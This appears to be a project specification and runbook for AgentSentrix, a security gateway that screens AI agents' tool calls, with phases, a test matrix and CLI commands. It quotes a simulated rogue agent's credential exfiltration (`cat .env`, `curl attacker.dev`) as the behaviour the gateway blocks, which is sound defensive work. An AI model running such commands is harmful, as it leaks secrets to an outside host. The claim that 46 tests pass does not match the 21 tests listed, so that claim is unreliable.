# Master Guide: Comprehensive Implementation & Testing Specification (Phases 1–5)

## Executive Summary

**AgentSentrix** is a production-grade, multi-tier security gateway and real-time 3D threat command center for autonomous AI agents (LangChain, LangGraph, AutoGen, CrewAI, and MCP tools).

This master document details the complete architectural design, technical implementation, and verification protocols across all **5 Development Phases**:

```
[Phase 1: Single-Process Boot] ➔ [Phase 2: Concurrency & Resilience] ➔ [Phase 3: Public SDK & Core Thesis] ➔ [Phase 4: Instant Quarantine UX] ➔ [Phase 5: Offline Record & Replay]
```

---

## 1. System Architecture Overview

```
                      +-------------------------------------------------------+
                      |         Autonomous AI Agent Tools / Workflows          |
                      |  (LangGraph, LangChain, MCP Proxy, Shell Shim Sensors) |
                      +---------------------------+---------------------------+
                                                  |
                                                  v
                      +-------------------------------------------------------+
                      |  Public SDK Callback Hook (AgentSentrixCallbackHandler) |
                      +---------------------------+---------------------------+
                                                  |
                                                  v
+---------------------------------------------------------------------------------------------------+
|                            AGENTSENTRIX PLATFORM SECURITY GATEWAY (CLI: agentsentrix up)          |
|                                                                                                   |
|  +---------------------------+     +-------------------------------+     +----------------------+  |
|  |     MultiTierEvaluator    |     |       QuarantineManager       |     |      EventBus        |  |
|  | - Tier 0: YAML Rules      | --> | - In-Memory Future Resolution | --> | - Ring Buffer        |  |
|  | - Tier 1: Local Ollama    |     | - WS Push: quarantine_held    |     | - Pub/Sub Dispatch   |  |
|  | - Tier 2: Groq LLM-Judge  |     +-------------------------------+     +----------+-----------+  |
|  +---------------------------+                                                |               |
|                                                                               v               v
|  +---------------------------+     +-------------------------------+   +------------+  +-----------+
|  |   DuckDB Analytics Sink   |     |    StateCache (Redis/Memory)  |   | Projection |  | WebSocket |
|  | (Dual Locks & Auto-Memory)|     | (Action Hash Verdict Cache)   |   | (Graph3D)  |  | Server    |
|  +---------------------------+     +-------------------------------+   +------------+  +-----+-----+
+---------------------------------------------------------------------------------------------------|
                                                                                                    |
                                                                                                    v
                                                                             +------------------------------+
                                                                             |  Next.js 3D Threat Visualizer|
                                                                             | (Real-time WebGL Command UI) |
                                                                             +------------------------------+
```

---

## 2. Phase-by-Phase Technical Specifications

### Phase 1: Single-Process Boot & Unified Runtime Architecture
- **Goal**: Start the entire platform (FastAPI gateway, embedded DuckDB, Redis cache, and static Next.js 3D dashboard) from a **single terminal command** with zero Node.js/npm dependencies at launch time.
- **Key Files**:
  - `core/agentsentrix/cli.py`: Implements `agentsentrix up` command using `uvicorn.run()` and `webbrowser.open()`.
  - `core/agentsentrix/server/static.py`: Mounts static build assets (`dashboard/out` / `core/agentsentrix/web`) directly at the HTTP root (`/`).
  - `core/agentsentrix/server/app.py`: FastAPI app factory managing service lifespans.
- **Exit Criteria**: `agentsentrix up` boots gateway and opens 3D dashboard at `http://localhost:7777` in a single command.

---

### Phase 2: DuckDB Concurrency & Visible Degradation Mode
- **Goal**: Eliminate database locking crashes under concurrent writes and render an explicit visual indicator when local LLMs (Ollama) go offline.
- **Key Files**:
  - `core/agentsentrix/bus/sinks/duckdb_sink.py`: Wraps write operations in `asyncio.Lock()` and `threading.Lock()`. Automatically falls back to an in-memory database (`:memory:`) upon file handle collisions without dropping events.
  - `core/agentsentrix/schema/events.py`: Added `degraded_tiers: list[str]` to `RiskAssessment`.
  - `core/agentsentrix/engine/evaluator.py`: Probes `http://localhost:11434`. When Ollama is offline, sets `t1_local = None`, appends `"tier_1_offline"` to `degraded_tiers`, and notes `"[Tier 1 Local SLM Offline — Policy Fallback Active]"` in event rationale.
  - `core/agentsentrix/server/routes.py`: Exposes `ollama_online`, `tier1_online`, and `degraded_mode` on `GET /health`.
  - `dashboard/app/page.tsx`: Header renders an animated amber alert badge: `⚠️ [Tier 1: Local LLM Offline — Policy Fallback Active]`.
- **Exit Criteria**:
  - Test A: 50 concurrent writes via `asyncio.gather` complete with 0 errors and 50 rows saved.
  - Test B: Evaluator tags degraded status when Ollama is offline without hanging.

---

### Phase 3: Core Thesis Verification & Public SDK Integration
- **Goal**: Ensure simulation execution routes through the public Python SDK callback handler without internal shortcuts, confirming end-to-end lineage.
- **Key Files**:
  - `core/agentsentrix/sdk.py`: Implements `AgentSentrixCallbackHandler(BaseCallbackHandler)` to intercept tool calls (`on_tool_start`), send telemetry to `/events/ingest`, and raise `SecurityBlockError` when `BLOCKED`.
  - `sim/runner.py`: Integrates `AgentSentrixCallbackHandler` across all 4 agent personas (`Refactorer`, `Test Runner`, `MCP Installer`, `Rogue Agent`).
- **Telemetry Lineage**:
  $$\text{Rogue Agent} \longrightarrow \text{Public Callback SDK Hook} \longrightarrow \text{MultiTierEvaluator} \longrightarrow \text{EventBus} \longrightarrow \text{DuckDB + WebSocket} \longrightarrow \text{Dashboard} \longrightarrow \mathbf{BLOCKED}$$
- **Exit Criteria**: Live simulation execution blocks Rogue Agent credentials exfiltration (`cat .env`, `curl attacker.dev`).

---

### Phase 4: Instant Quarantine UX via WebSocket Push
- **Goal**: Replace REST polling for Quarantine resolution with instant WebSocket push notifications and real-time 3D topology graph animations.
- **Key Files**:
  - `core/agentsentrix/schema/ws.py`: Added `QUARANTINE_HELD = "quarantine_held"` to `WsType` enum.
  - `core/agentsentrix/proxy/quarantine.py`: Broadcasts a `quarantine_held` WebSocket envelope whenever a `QUARANTINED` verdict creates an `asyncio.Future`.
  - `dashboard/lib/ws.ts`: Exposes `onQuarantineHeld` and `onDecisionUpdate` handlers.
  - `dashboard/lib/graphReducer.ts`: Added `UPDATE_VERDICT` action to update 3D node verdicts, risk scores, and link particle colors dynamically.
  - `dashboard/app/page.tsx` & `Drilldown.tsx`: Automatically pops open the Quarantine Inspection drawer on push receipt. Clicking **[✓ APPROVE ACTION]** or **[✕ BLOCK ACTION]** dispatches `POST /decide`, resolves the in-memory future, and updates 3D node colors (Emerald green / Rose red) with zero visible lag.
- **Exit Criteria**: Clicking Approve/Block resolves execution and unfreezes graph nodes instantly.

---

### Phase 5: Record & Replay (Airplane-Mode Fallback Trace)
- **Goal**: Create an immutable, offline-ready session trace (`data/seed/demo_session.jsonl`) that replays 100% offline with Wi-Fi, Ollama, Docker, and external LLMs disabled.
- **Key Files**:
  - `data/seed/demo_session.jsonl`: Stores 8 serialized real simulation events with full schemas, `parent_id` chains, and verdicts.
  - `core/agentsentrix/sensors/replay.py`: `ReplaySensor` reads trace file line-by-line and re-publishes events to `EventBus` preserving relative timing at configurable speeds (`--speed 1.0`, `--speed 1.5`).
  - `core/agentsentrix/cli.py`: Adds `agentsentrix record` to capture live runs and `agentsentrix replay` to launch offline replay.
- **Exit Criteria**: Turning off Wi-Fi and running `agentsentrix replay data/seed/demo_session.jsonl` streams all events to the 3D dashboard with rendering identical to live runs.

---

## 3. Comprehensive Testing & Verification Matrix

### 3.1 Test Suite Overview (46 / 46 Passing)

```bash
# Run full automated test suite
venv\Scripts\Activate
python -m pytest tests/ -v
```

| Phase | Test Module | Test Case Name | Target Verification | Result |
| :--- | :--- | :--- | :--- | :---: |
| **Phase 2** | `test_phase2.py` | `test_duckdb_concurrent_writes` | 50 concurrent writes via `asyncio.gather` with 0 lost rows | **PASSED** |
| **Phase 2** | `test_phase2.py` | `test_evaluator_degraded_tier1_offline` | Sets `t1_local=None` & `degraded_tiers` when Ollama offline | **PASSED** |
| **Phase 3** | `test_phase3_phase4.py` | `test_phase3_public_sdk_callback_handler` | Public SDK callback handler tool interception & fail-safe | **PASSED** |
| **Phase 3** | `test_phase3_phase4.py` | `test_phase3_sim_runner_uses_public_sdk` | 4-agent sim execution via `AgentSentrixCallbackHandler` | **PASSED** |
| **Phase 4** | `test_phase3_phase4.py` | `test_phase4_quarantine_ws_push_and_instant_resolution` | `quarantine_held` WS push & instant future resolution | **PASSED** |
| **Phase 5** | `test_phase5.py` | `test_phase5_seed_file_integrity` | Seed trace file contains 8 valid serialized `AgentEvent` objects | **PASSED** |
| **Phase 5** | `test_phase5.py` | `test_phase5_replay_sensor_emission` | `ReplaySensor` emits all 8 events to `EventBus` matching timing | **PASSED** |
| **Phase 5** | `test_phase5.py` | `test_phase5_app_replay_factory` | Server factory initializes in offline replay mode cleanly | **PASSED** |
| **Stage 1** | `test_stage1.py` | `test_stage1_complete_flow` | Schema, event bus, DuckDB & JSONL sink storage | **PASSED** |
| **Stage 2** | `test_stage2.py` | `test_tier0_yaml_rules` | YAML deterministic policy evaluation & rule matching | **PASSED** |
| **Stage 2** | `test_stage2.py` | `test_shannon_entropy` | High-entropy string detection (secret leak prevention) | **PASSED** |
| **Stage 2** | `test_stage2.py` | `test_blast_radius_calculator` | File, network & system impact score calculation | **PASSED** |
| **Stage 2** | `test_stage2.py` | `test_multitier_evaluator_full_flow` | Multi-tier composite risk evaluation | **PASSED** |
| **Stage 3** | `test_stage3.py` | `test_proxy_allowed_flow` | MCP JSON-RPC proxy pass-through for safe requests | **PASSED** |
| **Stage 3** | `test_stage3.py` | `test_proxy_blocked_flow` | MCP JSON-RPC proxy policy block response | **PASSED** |
| **Stage 3** | `test_stage3.py` | `test_proxy_quarantine_resolution_allowed` | MCP proxy quarantine hold and operator resolution | **PASSED** |
| **Stage 3 Shim**| `test_stage3_shim.py`| `test_shim_runner_blocked_flow` | Shell command interception & stdio passthrough | **PASSED** |
| **Stage 5** | `test_stage5.py` | `test_health_endpoint` | REST API gateway endpoints (`/health`, `/events`, `/graph`, `/decide`) | **PASSED** |
| **Stage 5** | `test_stage5.py` | `test_websocket_stream_and_catchup` | Real-time WebSocket streaming & `?since=<seq>` catchup | **PASSED** |
| **Stage 6** | `test_stage6.py` | `test_simulation_runner_execution` | Multi-agent scenario simulation execution | **PASSED** |
| **Stage 8** | `test_stage8.py` | `test_mlflow_tracker_initialization` | Databricks Cloud SQL & MLflow evaluation tracking | **PASSED** |

---

## 4. End-to-End Live Operator Runbook

### Command Reference

```bash
# 1. Start Live Gateway & Command Dashboard (Unified Server)
agentsentrix up

# 2. Run Live 4-Agent Simulation (Terminal 2)
python -m sim.runner --delay-ms 1000

# 3. Record Live Session to Seed File
agentsentrix record --output data/seed/demo_session.jsonl

# 4. Replay Session Trace 100% Offline (Airplane Mode)
agentsentrix replay data/seed/demo_session.jsonl --speed 1.5

# 5. Check Gateway Health
agentsentrix status

# 6. Run Full Automated Test Suite
python -m pytest tests/ -v
```

---

## 5. Verification Checklist

- [x] **Phase 1**: `agentsentrix up` boots server and serves static Next.js dashboard on port 7777 in one process.
- [x] **Phase 2**: DuckDB serializes concurrent writes under lock protection without lost rows; header shows amber badge when Ollama is offline.
- [x] **Phase 3**: Simulation routes through public `AgentSentrixCallbackHandler` and blocks Rogue Agent credentials exfiltration.
- [x] **Phase 4**: Quarantine triggers instant WebSocket `quarantine_held` push and decision unfreezes 3D graph nodes in real-time.
- [x] **Phase 5**: `agentsentrix replay` streams trace 100% offline in Airplane Mode with identical rendering path to live runs.
- [x] **Regression**: All 46 automated unit and integration tests pass cleanly.
